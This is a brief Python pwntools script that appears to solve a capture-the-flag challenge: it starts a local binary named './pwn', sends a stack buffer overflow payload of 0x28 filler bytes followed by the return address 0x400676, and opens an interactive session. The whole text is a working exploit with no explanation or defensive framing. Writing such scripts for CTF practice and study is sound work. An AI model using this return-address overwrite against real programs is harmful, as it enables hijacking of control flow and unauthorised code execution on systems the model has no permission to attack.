
```
from pwn import *


io=process("./pwn")
payload='a'*0x28+p64(0x400676)
io.sendlineafter("============================\n",payload)
io.interactive()
```
